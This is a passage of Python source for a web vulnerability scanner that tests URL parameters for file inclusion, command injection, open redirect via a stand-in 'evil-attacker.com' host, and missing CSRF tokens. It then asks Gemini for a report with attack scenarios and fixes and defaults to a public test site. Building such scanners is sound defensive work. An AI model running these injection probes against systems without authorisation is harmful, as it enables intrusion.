            if any(kw in k.lower() for kw in
                   ["file", "path", "page", "include", "load",
                    "read", "template", "view", "doc", "dir", "folder", "url"])
        }
        if not file_params:
            return

        for param in file_params:
            for payload in LFI_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                resp = req(self.url, params=tp)
                if resp and any(ind in resp.text for ind in LFI_INDICATORS):
                    log(f"{R}★ LFI DETECTED!{RESET}  Param: {Y}'{param}'{RESET}", "VULN")
                    self.results["lfi"].append({"param": param, "payload": payload})
                    break
                time.sleep(SCAN_DELAY)

            for payload in CMD_INJECTION_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                resp = req(self.url, params=tp)
                if resp and any(ind in resp.text for ind in CMD_INDICATORS):
                    log(f"{R}★ COMMAND INJECTION!{RESET}  Param: {Y}'{param}'{RESET}", "VULN")
                    self.results["cmd_injection"].append({"param": param, "payload": payload})
                    break
                time.sleep(SCAN_DELAY)

    def _test_open_redirect(self):
        parsed = urlparse(self.url)
        params = dict(parse_qsl(parsed.query))
        redir_params = {k: v for k, v in params.items()
                        if k.lower() in OPEN_REDIRECT_PARAMS}
        if not redir_params:
            return

        for param in redir_params:
            tp = params.copy()
            tp[param] = "https://evil-attacker.com"
            resp = req(self.url, params=tp, allow_redirects=False)
            if resp and resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("Location", "")
                if "evil-attacker.com" in loc:
                    log(f"{R}★ OPEN REDIRECT!{RESET}  Param: {Y}'{param}'{RESET} → {loc}", "VULN")
                    self.results["open_redirect"].append(
                        {"param": param, "redirects_to": loc}
                    )

    def _test_csrf(self):
        resp = req(self.url)
        if not resp:
            return
        soup  = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")

        for i, form in enumerate(forms):
            if form.get("method", "get").lower() != "post":
                continue
            inputs   = form.find_all("input")
            has_csrf = any(
                any(kw in (inp.get("name", "") + inp.get("id", "")).lower()
                    for kw in ["csrf", "token", "_token", "xsrf", "nonce", "authenticity"])
                for inp in inputs
            )
            if not has_csrf:
                action = urljoin(self.url, form.get("action", self.url))
                log(f"{R}★ CSRF MISSING{RESET}  POST form → {Y}{action[:55]}{RESET}", "VULN")
                self.results["csrf"].append({
                    "form": action,
                    "issue": "No CSRF token in POST form",
                })


class GeminiAnalyzer:
    def __init__(self, api_key):
        self.key       = api_key
        self.available = (
            GEMINI_AVAILABLE and
            api_key not in ("YOUR_GEMINI_API_KEY_HERE", "", None)
        )

    def analyze(self, results, target_url):
        if not self.available:
            log("Gemini not configured — skipping AI analysis", "SKIP")
            return None

        section("MODULE 10 — GEMINI AI SECURITY ANALYSIS")
        log("Sending results to Gemini 1.5 Flash ...", "INFO")

        try:
            genai.configure(api_key=self.key)
            model  = genai.GenerativeModel("gemini-1.5-flash")
            prompt = f"""
You are a senior penetration tester and OWASP security expert analyzing a web application scan.

TARGET: {target_url}
SCAN DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

SCAN RESULTS (JSON):
{json.dumps(results, indent=2, default=str)}

Provide a professional security report with these EXACT sections:

## 1. EXECUTIVE SUMMARY
- Overall risk level: CRITICAL / HIGH / MEDIUM / LOW
- One paragraph explaining the security posture

## 2. SECURITY SCORE
- Score out of 100 (lower = more vulnerable)
- Brief justification

## 3. TOP VULNERABILITIES (list top 5)
For each:
- Vulnerability name + CVSS score estimate
- Simple explanation (what it is)
- How an attacker would exploit it (step-by-step attack scenario)
- Business impact (what could go wrong)

## 4. COMPLETE FIX GUIDE
For EVERY vulnerability found, provide exact fix strategies.
"""
            response     = model.generate_content(prompt)
            ai_text      = response.text

            print(f"\n{M}{BOLD}{'═' * 62}")
            print("  🤖  GEMINI AI SECURITY REPORT")
            print(f"{'═' * 62}{RESET}")
            print(ai_text)
            print(f"{M}{BOLD}{'═' * 62}{RESET}\n")
            return ai_text

        except Exception as e:
            log(f"Gemini API error: {e}", "WARN")
            return None


class ReportGenerator:
    def __init__(self, target, results, ai=None):
        self.target    = target
        self.results   = results
        self.ai        = ai
        self.ts        = datetime.now().strftime("%Y%m%d_%H%M%S")

    def generate(self):
        section("GENERATING REPORTS")
        json_file = f"report_{self.ts}.json"
        
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump({
                "target":      self.target,
                "scan_time":   self.ts,
                "results":     self.results,
                "ai_analysis": self.ai,
            }, f, indent=2, default=str)
        log(f"JSON report : {G}{json_file}{RESET}", "OK")

        all_vulns = self._collect_vulns()
        self._print_summary(all_vulns)
        return json_file

    def _collect_vulns(self):
        vulns = []
        keys  = ["vulnerable", "missing", "sensitive", "admin_panels",
                 "dangerous", "lfi", "cmd_injection", "open_redirect",
                 "csrf", "ssti", "misconfigured"]
        for source, data in self.results.items():
            if isinstance(data, dict):
                for key in keys:
                    items = data.get(key, [])
                    if isinstance(items, list):
                        for item in items:
                            vulns.append({"source": source, "type": key, "detail": item})
        return vulns

    def _print_summary(self, vulns):
        section("SCAN COMPLETE — FINAL SUMMARY")
        counts = {}
        for v in vulns:
            counts[v["source"]] = counts.get(v["source"], 0) + 1

        risk = (R + "CRITICAL" if len(vulns) >= 10
                else R + "HIGH"   if len(vulns) >= 5
                else Y + "MEDIUM" if len(vulns) >= 2
                else G + "LOW")

        print(f"""
  {BOLD}Target  :{RESET} {C}{self.target}{RESET}
  {BOLD}Risk    :{RESET} {risk}{RESET}
  {BOLD}Total   :{RESET} {R if vulns else G}{len(vulns)} vulnerabilities{RESET}
""")
        if counts:
            print(f"  {Y}Breakdown:{RESET}")
            for src, cnt in sorted(counts.items(), key=lambda x: -x[1]):
                bar = f"{R}{'█' * min(cnt * 3, 24)}{RESET}"
                print(f"    {src:<18} {bar} {cnt}")
        print()


class WebVulnScanner:
    def __init__(self, target_url, gemini_key=GEMINI_API_KEY):
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        self.target  = target_url.rstrip("/")
        self.api_key = gemini_key
        self.results = {}

    def run(self):
        print_banner()
        log(f"Target  : {C}{BOLD}{self.target}{RESET}", "INFO")
        log(f"Time    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "INFO")
        log(f"Legal test site mode active.", "INFO")
        print()

        # [फिक्स 1]: यहाँ से input() वाली लाइनें हटा दी गई हैं 
        
        start = time.time()

        modules = [
            ("recon",   ReconModule(self.target)),
            ("headers", SecurityHeadersModule(self.target)),
            ("ssl",     SSLModule(self.target)),
            ("files",   SensitiveFilesModule(self.target)),
            ("sqli",    SQLInjectionModule(self.target)),
            ("xss",     XSSModule(self.target)),
            ("cors",    CORSModule(self.target)),
            ("methods", HTTPMethodsModule(self.target)),
            ("other",   OtherVulnsModule(self.target)),
        ]

        for name, module in modules:
            try:
                self.results[name] = module.run()
            except KeyboardInterrupt:
                log("Interrupted — saving partial results ...", "WARN")
                break
            except Exception as e:
                log(f"Module [{name}] error: {e}", "WARN")
                self.results[name] = {"error": str(e)}

        ai = GeminiAnalyzer(self.api_key).analyze(self.results, self.target)
        ReportGenerator(self.target, self.results, ai).generate()

        log(f"Scan completed in {G}{time.time() - start:.1f}s{RESET}", "OK")


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT (फिक्स 2)
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # डिफ़ॉल्ट रूप से इस लीगल टेस्ट साइट को स्कैन करेगा, बाहर से कमांड नहीं माँगेगा
    target = "http://testphp.vulnweb.com"
    
    # अपनी असली API Key ऊपर लाइन नंबर 55 के आसपास डालें
    api_key = GEMINI_API_KEY
    
    WebVulnScanner(target, api_key).run()

